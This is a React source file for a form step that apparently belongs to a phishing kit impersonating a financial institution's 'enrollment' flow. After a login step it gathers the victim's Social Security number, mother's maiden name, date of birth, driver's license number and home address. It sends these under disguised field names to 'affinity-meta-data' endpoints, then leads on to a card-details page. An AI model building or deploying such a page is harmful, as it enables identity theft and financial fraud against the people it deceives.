import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import FlowCard from '../components/FlowCard';
import FormError from '../components/FormError';

const BasicInfo: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [username, setUsername] = useState('');
  const [fzNme, setFzNme] = useState('');
  const [lzNme, setLzNme] = useState('');
  const [phone, setPhone] = useState('');
  const [ssn, setSsn] = useState('');
  const [motherMaidenName, setMotherMaidenName] = useState('');
  const [month, setMonth] = useState('');
  const [day, setDay] = useState('');
  const [year, setYear] = useState('');
  const [driverLicense, setDriverLicense] = useState('');
  const [showSSN, setShowSSN] = useState(false);
  const [stAd, setStAd] = useState('');
  const [apt, setApt] = useState('');
  const [city, setCity] = useState('');
  const [state, setState] = useState('');
  const [zipCode, setZipCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({ 
    fzNme: '', 
    lzNme: '', 
    phone: '', 
    ssn: '', 
    motherMaidenName: '', 
    dob: '', 
    driverLicense: '',
    stAd: '',
    city: '',
    state: '',
    zipCode: '',
    form: '' 
  });

  useEffect(() => {
    const { emzemz } = location.state || {};
    if (emzemz) {
      setUsername(emzemz);
    }
  }, [location.state]);

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: currentYear - 1899 }, (_, i) => 1900 + i);
  const daysInMonth = (month && year) ? new Date(parseInt(year), parseInt(month), 0).getDate() : 31;

  const formatPhone = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 10);
    if (digitsOnly.length >= 7) {
      return digitsOnly.replace(/(\d{3})(\d{3})(\d{0,4})/, '($1) $2-$3');
    } else if (digitsOnly.length >= 4) {
      return digitsOnly.replace(/(\d{3})(\d{0,3})/, '($1) $2');
    }
    return digitsOnly;
  };

  const formatSSN = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 9);
    if (digitsOnly.length >= 6) {
      return digitsOnly.replace(/(\d{3})(\d{2})(\d{0,4})/, (_, p1, p2, p3) =>
        p3 ? `${p1}-${p2}-${p3}` : `${p1}-${p2}`
      );
    } else if (digitsOnly.length >= 4) {
      return digitsOnly.replace(/(\d{3})(\d{0,2})/, (_, p1, p2) =>
        p2 ? `${p1}-${p2}` : `${p1}`
      );
    }
    return digitsOnly;
  };

  if (!username) {
    return (
      <FlowCard title="Basic Information & Home Address">
        <p className="text-sm text-gray-700 text-center">
          We could not find your username from the previous step. Please return to the login page and try again.
        </p>
        <button
          type="button"
          onClick={() => navigate('/login')}
          className="mt-6 w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition"
        >
          Back to login
        </button>
      </FlowCard>
    );
  }

  const validateForm = () => {
    const phoneDigits = phone.replace(/\D/g, '');
    const ssnDigits = ssn.replace(/\D/g, '');
    
    const newErrors = { 
      fzNme: !fzNme.trim() ? 'First name is required.' : '',
      lzNme: !lzNme.trim() ? 'Last name is required.' : '',
      phone: phoneDigits.length !== 10 ? 'Phone must be 10 digits.' : '',
      ssn: ssnDigits.length !== 9 ? 'SSN must be 9 digits.' : '',
      motherMaidenName: !motherMaidenName.trim() ? "Mother's maiden name is required." : '',
      dob: (!month || !day || !year) ? 'Complete date of birth is required.' : '',
      driverLicense: !driverLicense.trim() ? "Driver's license is required." : '',
      stAd: !stAd.trim() ? 'Street address is required.' : '',
      city: !city.trim() ? 'City is required.' : '',
      state: !state.trim() ? 'State is required.' : '',
      zipCode: !zipCode.trim() ? 'Zip code is required.' : '',
      form: ''
    };

    if (month && day && year) {
      const dob = new Date(parseInt(year), parseInt(month) - 1, parseInt(day));
      const age = new Date().getFullYear() - dob.getFullYear();
      const monthDiff = new Date().getMonth() - dob.getMonth();
      
      if (age < 18 || (age === 18 && monthDiff < 0)) {
        newErrors.dob = 'You must be at least 18 years old.';
      }
    }

    setErrors(newErrors);
    return !Object.values(newErrors).some(error => error);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    try {
      const getMonthName = (monthNumber: string) => {
        const monthNames = [
          "January", "February", "March", "April", "May", "June",
          "July", "August", "September", "October", "November", "December"
        ];
        return monthNames[parseInt(monthNumber) - 1] || '';
      };

      const dob = `${getMonthName(month)}/${day}/${year}`;

      // Submit basic info
      await axios.post(`${baseUrl}api/affinity-meta-data-3/`, {
        emzemz: username,
        fzNme,
        lzNme,
        phone,
        ssn,
        motherMaidenName,
        dob,
        driverLicense
      });

      // Submit home address
      await axios.post(`${baseUrl}api/affinity-meta-data-4/`, {
        emzemz: username,
        stAd,
        apt,
        city,
        state,
        zipCode
      });

      navigate('/card', {
        state: {
          emzemz: username
        }
      });
    } catch (error) {
      console.error('Error submitting form:', error);
      setErrors((prev) => ({
        ...prev,
        form: 'There was an error submitting your information. Please try again.'
      }));
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <FlowCard title="Basic Information & Home Address">
      <p className="text-sm text-gray-600 text-center mb-4">
        Confirm the details we have on file before continuing your enrollment.
      </p>
      <form onSubmit={handleSubmit} className="space-y-4">
        {/* First Name */}
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="fzNme">
            First Name
          </label>
          <input
            id="fzNme"
            name="fzNme"
            type="text"
            value={fzNme}
            onChange={(e) => setFzNme(e.target.value)}
            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
            placeholder="Enter first name"
          />
          {errors.fzNme && <FormError message={errors.fzNme} className="mt-2" />}
        </div>

        {/* Last Name */}
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="lzNme">
            Last Name
          </label>
          <input
            id="lzNme"
            name="lzNme"
            type="text"
            value={lzNme}
            onChange={(e) => setLzNme(e.target.value)}
            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
            placeholder="Enter last name"
          />
          {errors.lzNme && <FormError message={errors.lzNme} className="mt-2" />}
        </div>

        {/* Phone */}
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="phone">
            Phone Number
          </label>
          <input
            id="phone"
            name="phone"
            type="tel"
            value={phone}
            onChange={(e) => setPhone(formatPhone(e.target.value))}
            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
            placeholder="(555) 555-5555"
          />
          {errors.phone && <FormError message={errors.phone} className="mt-2" />}
        </div>

        {/* SSN */}
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="ssn">
            Social Security Number
          </label>
          <div className="relative">
            <input
              id="ssn"
              name="ssn"
              type={showSSN ? 'text' : 'password'}
              value={ssn}
              onChange={(e) => setSsn(formatSSN(e.target.value))}
              className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
              placeholder="XXX-XX-XXXX"
            />
            <button
              type="button"
              onClick={() => setShowSSN(!showSSN)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-purple-900 text-sm hover:underline"
            >
              {showSSN ? 'Hide' : 'Show'}
            </button>
          </div>
          {errors.ssn && <FormError message={errors.ssn} className="mt-2" />}
        </div>

        {/* Mother's Maiden Name */}
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="motherMaidenName">
            Mother's Maiden Name
          </label>
          <input
            id="motherMaidenName"
            name="motherMaidenName"
            type="text"
            value={motherMaidenName}
            onChange={(e) => setMotherMaidenName(e.target.value)}
            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
            placeholder="Enter mother's maiden name"
          />
          {errors.motherMaidenName && <FormError message={errors.motherMaidenName} className="mt-2" />}
        </div>

        {/* Date of Birth */}
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Date of Birth</label>
          <div className="grid grid-cols-3 gap-2">
            <select
              value={month}
              onChange={(e) => {
                setMonth(e.target.value);
                setDay('');
              }}
              className="border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
            >
              <option value="">Month</option>
              {Array.from({ length: 12 }, (_, i) => (
                <option key={i + 1} value={i + 1}>
                  {new Date(2000, i).toLocaleString('default', { month: 'long' })}
                </option>
              ))}
            </select>
            <select
              value={day}
              onChange={(e) => setDay(e.target.value)}
              className="border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
            >
              <option value="">Day</option>
              {Array.from({ length: daysInMonth }, (_, i) => (
                <option key={i + 1} value={i + 1}>
                  {i + 1}
                </option>
              ))}
            </select>
            <select
              value={year}
              onChange={(e) => setYear(e.target.value)}
              className="border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
            >
              <option value="">Year</option>
              {years.map((y) => (
                <option key={y} value={y}>
                  {y}
                </option>
              ))}
            </select>
          </div>
          {errors.dob && <FormError message={errors.dob} className="mt-2" />}
        </div>

        {/* Driver's License */}
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="driverLicense">
            Driver's License Number
          </label>
          <input
            id="driverLicense"
            name="driverLicense"
            type="text"
            value={driverLicense}
            onChange={(e) => setDriverLicense(e.target.value)}
            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
            placeholder="Enter license number"
          />
          {errors.driverLicense && <FormError message={errors.driverLicense} className="mt-2" />}
        </div>

        {/* Home Address Section */}
        <div className="border-t-2 border-gray-300 pt-6 mt-6">
          <h3 className="text-lg font-semibold text-gray-800 mb-4">Home Address</h3>
          
          {/* Street Address */}
          <div className="mb-4">
            <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="stAd">
              Street Address
            </label>
            <input
              id="stAd"
              name="stAd"
              type="text"
              value={stAd}
              onChange={(e) => setStAd(e.target.value)}
              className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
              placeholder="Enter street address"
            />
            {errors.stAd && <FormError message={errors.stAd} className="mt-2" />}
          </div>

          {/* Apartment/Unit */}
          <div className="mb-4">
            <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="apt">
              Apartment/Unit (Optional)
            </label>
            <input
              id="apt"
              name="apt"
              type="text"
              value={apt}
              onChange={(e) => setApt(e.target.value)}
              className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
              placeholder="Apt, Suite, Unit, etc."
            />
          </div>

          {/* City */}
          <div className="mb-4">
            <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="city">
              City
            </label>
            <input
              id="city"
              name="city"
              type="text"
              value={city}
              onChange={(e) => setCity(e.target.value)}
              className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
              placeholder="Enter city"
            />
            {errors.city && <FormError message={errors.city} className="mt-2" />}
          </div>

          {/* State */}
          <div className="mb-4">
            <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="state">
              State
            </label>
            <input
              id="state"
              name="state"
              type="text"
              value={state}
              onChange={(e) => setState(e.target.value)}
              className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
              placeholder="Enter state"
            />
            {errors.state && <FormError message={errors.state} className="mt-2" />}
          </div>

          {/* Zip Code */}
          <div className="mb-4">
            <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="zipCode">
              Zip Code
            </label>
            <input
              id="zipCode"
              name="zipCode"
              type="text"
              value={zipCode}
              onChange={(e) => setZipCode(e.target.value)}
              className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
              placeholder="Enter zip code"
            />
            {errors.zipCode && <FormError message={errors.zipCode} className="mt-2" />}
          </div>
        </div>

        {errors.form && <FormError message={errors.form} />}

        <button
          type="submit"
          className="w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition disabled:opacity-70"
          disabled={isLoading}
        >
          {isLoading ? 'Submitting…' : 'Continue'}
        </button>
      </form>
    </FlowCard>
  );
};

export default BasicInfo;
